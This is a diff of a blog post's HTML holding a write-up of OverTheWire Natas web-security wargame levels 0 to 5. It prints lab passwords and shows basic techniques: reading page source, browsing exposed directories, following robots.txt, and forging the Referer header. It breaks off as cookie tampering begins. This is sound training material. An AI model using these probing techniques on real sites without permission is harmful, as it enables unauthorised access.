@@ -1,396 +1,155 @@
-<!DOCTYPE html>
-<html lang="en">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="robots" content="noodp" />
-        <title>OverTheWire Natas - bchoy.me</title><meta name="Description" content="bchoy.me"><meta property="og:title" content="OverTheWire Natas" />
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>OverTheWire Natas - bchoy.me</title><meta name=Description content="bchoy.me"><meta property="og:title" content="OverTheWire Natas">
 <meta property="og:description" content="Following up on my Bandit post, OverTheWire Natas teaches the basics of serverside web-security. These are quick notes for my solutions to level 0-10. I&rsquo;ll be doing these in preperation for the OSCP pentesting course I plan on taking.
 Level 0
 The password to this level is listed on the natas game description:
 Username: natas0
 Password: natas0
 URL:      http://natas0.natas.labs.overthewire.org
-" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://bchoy.me/posts/2018-01-05-overthewire-natas/" /><meta property="og:image" content="https://bchoy.me/logo.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2018-01-05T16:26:56+00:00" />
-<meta property="article:modified_time" content="2018-01-05T16:26:56+00:00" /><meta property="og:site_name" content="bchoy.me" />
-
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://bchoy.me/logo.png"/>
-
-<meta name="twitter:title" content="OverTheWire Natas"/>
-<meta name="twitter:description" content="Following up on my Bandit post, OverTheWire Natas teaches the basics of serverside web-security. These are quick notes for my solutions to level 0-10. I&rsquo;ll be doing these in preperation for the OSCP pentesting course I plan on taking.
+"><meta property="og:type" content="article"><meta property="og:url" content="https://bchoy.me/posts/2018-01-05-overthewire-natas/"><meta property="og:image" content="https://bchoy.me/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-01-05T16:26:56+00:00"><meta property="article:modified_time" content="2018-01-05T16:26:56+00:00"><meta property="og:site_name" content="bchoy.me"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bchoy.me/logo.png"><meta name=twitter:title content="OverTheWire Natas"><meta name=twitter:description content="Following up on my Bandit post, OverTheWire Natas teaches the basics of serverside web-security. These are quick notes for my solutions to level 0-10. I&rsquo;ll be doing these in preperation for the OSCP pentesting course I plan on taking.
 Level 0
 The password to this level is listed on the natas game description:
 Username: natas0
 Password: natas0
 URL:      http://natas0.natas.labs.overthewire.org
-"/>
-<meta name="application-name" content="My cool site">
-<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
-        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://bchoy.me/posts/2018-01-05-overthewire-natas/" /><link rel="prev" href="https://bchoy.me/posts/2017-12-26-overthewire-bandit/" /><link rel="next" href="https://bchoy.me/posts/2018-09-11-vmware-ssh-bug/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
-    {
-        "@context": "http://schema.org",
-        "@type": "BlogPosting",
-        "headline": "OverTheWire Natas",
-        "inLanguage": "en",
-        "mainEntityOfPage": {
-            "@type": "WebPage",
-            "@id": "https:\/\/bchoy.me\/posts\/2018-01-05-overthewire-natas\/"
-        },"genre": "posts","wordcount":  1089 ,
-        "url": "https:\/\/bchoy.me\/posts\/2018-01-05-overthewire-natas\/","datePublished": "2018-01-05T16:26:56+00:00","dateModified": "2018-01-05T16:26:56+00:00","license": "bchoy.me","publisher": {
-            "@type": "Organization",
-            "name": ""},"author": {
-                "@type": "Person",
-                "name": "Brian Choy"
-            },"description": ""
-    }
-    </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
-
-        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
-    <div class="header-wrapper">
-        <div class="header-title">
-            <a href="/" title="bchoy.me">bchoy.me</a>
-        </div>
-        <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> Blog </a><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/resume"> Resume </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
-                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
-                        </span>
-                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-                </a></div>
-        </div>
-    </div>
-</header><header class="mobile" id="header-mobile">
-    <div class="header-container">
-        <div class="header-wrapper">
-            <div class="header-title">
-                <a href="/" title="bchoy.me">bchoy.me</a>
-            </div>
-            <div class="menu-toggle" id="menu-toggle-mobile">
-                <span></span><span></span><span></span>
-            </div>
-        </div>
-        <div class="menu" id="menu-mobile"><div class="search-wrapper">
-                    <div class="search mobile" id="search-mobile">
-                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
-                        </a>
-                        <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
-                        </span>
-                    </div>
-                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
-                        Cancel
-                    </a>
-                </div><a class="menu-item" href="/posts/" title="">Blog</a><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/resume" title="">Resume</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-            </a></div>
-    </div>
-</header><div class="search-dropdown desktop">
-        <div id="search-dropdown-desktop"></div>
-    </div>
-    <div class="search-dropdown mobile">
-        <div id="search-dropdown-mobile"></div>
-    </div><main class="main">
-                <div class="container"><div class="toc" id="toc-auto">
-            <h2 class="toc-title">Contents</h2>
-            <div class="toc-content always-active" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">OverTheWire Natas</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://bchoy.me" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Brian Choy</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="01-05-2018">01-05-2018</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1089 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
-        </div><div class="details toc" id="toc-static"  data-kept="">
-                <div class="details-summary toc-title">
-                    <span>Contents</span>
-                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
-                </div>
-                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
-  <ul>
-    <li><a href="#level-0">Level 0</a></li>
-    <li><a href="#level-0---1">Level 0 -&gt; 1</a></li>
-    <li><a href="#level-1---2">Level 1 -&gt; 2</a></li>
-    <li><a href="#level-2---3">Level 2 -&gt; 3</a></li>
-    <li><a href="#level-3---4">Level 3 -&gt; 4</a></li>
-    <li><a href="#level-4---5">Level 4 -&gt; 5</a></li>
-    <li><a href="#level-6---7">Level 6 -&gt; 7</a></li>
-    <li><a href="#level-7---8">Level 7 -&gt; 8</a></li>
-    <li><a href="#level-8---9">Level 8 -&gt; 9</a></li>
-    <li><a href="#level-9---10">Level 9 -&gt; 10</a></li>
-    <li><a href="#level-10---11">Level 10 -&gt; 11</a></li>
-  </ul>
-</nav></div>
-            </div><div class="content" id="content"><p>Following up on my Bandit post, <a href="http://overthewire.org/wargames/natas/" target="_blank" rel="noopener noreffer ">OverTheWire Natas</a> teaches the basics of serverside web-security. These are quick notes for my solutions to level 0-10. I&rsquo;ll be doing these in preperation for the OSCP pentesting course I plan on taking.</p>
-<h2 id="level-0">Level 0</h2>
-<p>The password to this level is listed on the natas game description:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Username: natas0
-</span></span><span class="line"><span class="cl">Password: natas0
-</span></span><span class="line"><span class="cl">URL:      http://natas0.natas.labs.overthewire.org
-</span></span></code></pre></div><h2 id="level-0---1">Level 0 -&gt; 1</h2>
-<p>Viewing the source code reveals a commented line containing the password for the next level.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  You can find the password for the next level on this page.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="c">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span></code></pre></div><h2 id="level-1---2">Level 1 -&gt; 2</h2>
-<p>Viewing the source again reveals the password for the next level. You can bypass the right click block with keyboard shortcuts.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  You can find the password for the next level on this page, but rightclicking
-</span></span><span class="line"><span class="cl">  has been blocked!
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="c">&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span></code></pre></div><h2 id="level-2---3">Level 2 -&gt; 3</h2>
-<p>The following line in the source reveals that a directory &lsquo;files&rsquo; exists.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  There is nothing on this page
-</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;files/pixel.png&#34;</span> <span class="p">/&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>Checking out the &lsquo;files&rsquo; directory at <a href="http://natas2.natas.labs.overthewire.org/files/" target="_blank" rel="noopener noreffer ">http://natas2.natas.labs.overthewire.org/files/</a> reveals that there is also a users.txt file containing the credentials for the next level.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># username:password
-</span></span><span class="line"><span class="cl">alice:BYNdCesZqW
-</span></span><span class="line"><span class="cl">bob:jw2ueICLvT
-</span></span><span class="line"><span class="cl">charlie:G5vCxkVV3m
-</span></span><span class="line"><span class="cl">natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
-</span></span><span class="line"><span class="cl">eve:zo4mJWyNj2
-</span></span><span class="line"><span class="cl">mallory:9urtcpzBmH
-</span></span></code></pre></div><h2 id="level-3---4">Level 3 -&gt; 4</h2>
-<p>The source drops a hint that there is a robots.txt file blocking Google from crawling.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">  There is nothing on this page
-</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>robots.txt contains:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">User-agent: *
-</span></span><span class="line"><span class="cl">Disallow: /s3cr3t/
-</span></span></code></pre></div><p>This blocks the &lsquo;s3cr3t&rsquo; directory from being crawled, and also tells me that this directory may exist. Navigating to <a href="http://natas3.natas.labs.overthewire.org/s3cr3t" target="_blank" rel="noopener noreffer ">http://natas3.natas.labs.overthewire.org/s3cr3t</a> reveals that user.txt exists and it contains the credentials for the next level.</p>
-<blockquote>
-<p>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</p>
-</blockquote>
-<h2 id="level-4---5">Level 4 -&gt; 5</h2>
-<p>The source shows nothing of interest and the message displayed on the page gives me a huge hint to move foward.</p>
-<blockquote>
-<p>Access disallowed. You are visiting from &quot;&quot; while authorized users should come only from &ldquo;<a href="http://natas5.natas.labs.overthewire.org/%22" target="_blank" rel="noopener noreffer ">http://natas5.natas.labs.overthewire.org/"</a></p>
-</blockquote>
-<p>I suspect that I would have to modify my request to the natas4 page and set natas5 as my referrer. To do this I downloaded a Firefox plugin called Tamper Data.</p>
-<figure><a class="lightgallery" href="/posts/2018-01-05-overthewire-natas/images/tamper-data.png" title="/posts/2018-01-05-overthewire-natas/images/tamper-data.png" data-thumbnail="/posts/2018-01-05-overthewire-natas/images/tamper-data.png" data-sub-html="<h2>Tamper Data</h2>">
-        <img
-            class="lazyload"
-            src="/svg/loading.min.svg"
-            data-src="/posts/2018-01-05-overthewire-natas/images/tamper-data.png"
-            data-srcset="/posts/2018-01-05-overthewire-natas/images/tamper-data.png, /posts/2018-01-05-overthewire-natas/images/tamper-data.png 1.5x, /posts/2018-01-05-overthewire-natas/images/tamper-data.png 2x"
-            data-sizes="auto"
-            alt="/posts/2018-01-05-overthewire-natas/images/tamper-data.png" width="1543" height="902" />
-    </a><figcaption class="image-caption">Tamper Data</figcaption>
-    </figure>
-<p>Using Tamper Data I&rsquo;m able to interept my request and change the referral to come from <a href="http://natas5.natas.labs.overthewire.org/" target="_blank" rel="noopener noreffer ">http://natas5.natas.labs.overthewire.org/</a>.</p>
-<p>Upon modifying the request, I&rsquo;m greeted with the password for the next level.</p>
-<blockquote>
-<p>Access granted. The password for natas5 is
-iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</p>
-</blockquote>
-<pre tabindex="0"><code>
+"><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://bchoy.me/posts/2018-01-05-overthewire-natas/><link rel=prev href=https://bchoy.me/posts/2017-12-26-overthewire-bandit/><link rel=next href=https://bchoy.me/posts/2018-09-11-vmware-ssh-bug/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"OverTheWire Natas","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/bchoy.me\/posts\/2018-01-05-overthewire-natas\/"},"genre":"posts","wordcount":1089,"url":"https:\/\/bchoy.me\/posts\/2018-01-05-overthewire-natas\/","datePublished":"2018-01-05T16:26:56+00:00","dateModified":"2018-01-05T16:26:56+00:00","license":"bchoy.me","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Brian Choy"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"light"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"light"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=bchoy.me>bchoy.me</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Blog </a><a class=menu-item href=/about>About </a><a class=menu-item href=/resume>Resume </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i>
+</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i>
+</a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i>
+</span></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=bchoy.me>bchoy.me</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i>
+</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i>
+</a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Blog</a><a class=menu-item href=/about title>About</a><a class=menu-item href=/resume title>Resume</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">OverTheWire Natas</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://bchoy.me title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Brian Choy</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=01-05-2018>01-05-2018</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1089 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;6 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#level-0>Level 0</a></li><li><a href=#level-0---1>Level 0 -> 1</a></li><li><a href=#level-1---2>Level 1 -> 2</a></li><li><a href=#level-2---3>Level 2 -> 3</a></li><li><a href=#level-3---4>Level 3 -> 4</a></li><li><a href=#level-4---5>Level 4 -> 5</a></li><li><a href=#level-6---7>Level 6 -> 7</a></li><li><a href=#level-7---8>Level 7 -> 8</a></li><li><a href=#level-8---9>Level 8 -> 9</a></li><li><a href=#level-9---10>Level 9 -> 10</a></li><li><a href=#level-10---11>Level 10 -> 11</a></li></ul></nav></div></div><div class=content id=content><p>Following up on my Bandit post, <a href=http://overthewire.org/wargames/natas/ target=_blank rel="noopener noreffer">OverTheWire Natas</a> teaches the basics of serverside web-security. These are quick notes for my solutions to level 0-10. I&rsquo;ll be doing these in preperation for the OSCP pentesting course I plan on taking.</p><h2 id=level-0>Level 0</h2><p>The password to this level is listed on the natas game description:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Username: natas0
+</span></span><span class=line><span class=cl>Password: natas0
+</span></span><span class=line><span class=cl>URL:      http://natas0.natas.labs.overthewire.org
+</span></span></code></pre></div><h2 id=level-0---1>Level 0 -> 1</h2><p>Viewing the source code reveals a commented line containing the password for the next level.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;content&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  You can find the password for the next level on this page.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=c>&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
+</span></span></code></pre></div><h2 id=level-1---2>Level 1 -> 2</h2><p>Viewing the source again reveals the password for the next level. You can bypass the right click block with keyboard shortcuts.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;content&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  You can find the password for the next level on this page, but rightclicking
+</span></span><span class=line><span class=cl>  has been blocked!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=c>&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
+</span></span></code></pre></div><h2 id=level-2---3>Level 2 -> 3</h2><p>The following line in the source reveals that a directory &lsquo;files&rsquo; exists.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;content&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  There is nothing on this page
+</span></span><span class=line><span class=cl>  <span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;files/pixel.png&#34;</span> <span class=p>/&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>Checking out the &lsquo;files&rsquo; directory at <a href=http://natas2.natas.labs.overthewire.org/files/ target=_blank rel="noopener noreffer">http://natas2.natas.labs.overthewire.org/files/</a> reveals that there is also a users.txt file containing the credentials for the next level.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl># username:password
+</span></span><span class=line><span class=cl>alice:BYNdCesZqW
+</span></span><span class=line><span class=cl>bob:jw2ueICLvT
+</span></span><span class=line><span class=cl>charlie:G5vCxkVV3m
+</span></span><span class=line><span class=cl>natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+</span></span><span class=line><span class=cl>eve:zo4mJWyNj2
+</span></span><span class=line><span class=cl>mallory:9urtcpzBmH
+</span></span></code></pre></div><h2 id=level-3---4>Level 3 -> 4</h2><p>The source drops a hint that there is a robots.txt file blocking Google from crawling.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;content&#34;</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>  There is nothing on this page
+</span></span><span class=line><span class=cl>  <span class=c>&lt;!-- No more information leaks!! Not even Google will find it this time... --&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>robots.txt contains:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>User-agent: *
+</span></span><span class=line><span class=cl>Disallow: /s3cr3t/
+</span></span></code></pre></div><p>This blocks the &lsquo;s3cr3t&rsquo; directory from being crawled, and also tells me that this directory may exist. Navigating to <a href=http://natas3.natas.labs.overthewire.org/s3cr3t target=_blank rel="noopener noreffer">http://natas3.natas.labs.overthewire.org/s3cr3t</a> reveals that user.txt exists and it contains the credentials for the next level.</p><blockquote><p>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</p></blockquote><h2 id=level-4---5>Level 4 -> 5</h2><p>The source shows nothing of interest and the message displayed on the page gives me a huge hint to move foward.</p><blockquote><p>Access disallowed. You are visiting from "" while authorized users should come only from &ldquo;<a href=http://natas5.natas.labs.overthewire.org/%22 target=_blank rel="noopener noreffer">http://natas5.natas.labs.overthewire.org/"</a></p></blockquote><p>I suspect that I would have to modify my request to the natas4 page and set natas5 as my referrer. To do this I downloaded a Firefox plugin called Tamper Data.</p><figure><a class=lightgallery href=/posts/2018-01-05-overthewire-natas/images/tamper-data.png title=/posts/2018-01-05-overthewire-natas/images/tamper-data.png data-thumbnail=/posts/2018-01-05-overthewire-natas/images/tamper-data.png data-sub-html="<h2>Tamper Data</h2>"><img class=lazyload src=/svg/loading.min.svg data-src=/posts/2018-01-05-overthewire-natas/images/tamper-data.png data-srcset="/posts/2018-01-05-overthewire-natas/images/tamper-data.png, /posts/2018-01-05-overthewire-natas/images/tamper-data.png 1.5x, /posts/2018-01-05-overthewire-natas/images/tamper-data.png 2x" data-sizes=auto alt=/posts/2018-01-05-overthewire-natas/images/tamper-data.png width=1543 height=902></a><figcaption class=image-caption>Tamper Data</figcaption></figure><p>Using Tamper Data I&rsquo;m able to interept my request and change the referral to come from <a href=http://natas5.natas.labs.overthewire.org/ target=_blank rel="noopener noreffer">http://natas5.natas.labs.overthewire.org/</a>.</p><p>Upon modifying the request, I&rsquo;m greeted with the password for the next level.</p><blockquote><p>Access granted. The password for natas5 is
+iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</p></blockquote><pre tabindex=0><code>
 ## Level 5 -&gt; 6
 
 After logging in I get this error:
 
 ```text
 Access disallowed. You are not logged in
-</code></pre><p>I decided to fire up Tamper Data again and poke around to see I can find something wrong with the cookie sent.</p>
-<figure><a class="lightgallery" href="/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png" title="/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png" data-thumbnail="/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png" data-sub-html="<h2>Tamper Data Cookie Field</h2>">
-        <img
-            class="lazyload"
-            src="/svg/loading.min.svg"
-            data-src="/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png"
-            data-srcset="/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png, /posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png 1.5x, /posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png 2x"
-            data-sizes="auto"
-            alt="/posts/2018-01-05-overthewire-natas/images/tamper-data-cookie.png" width="1543" height="902" />
-    </a><figcaption class="image-caption">Tamper Data Cookie Field</figcaption>
-    </figure>
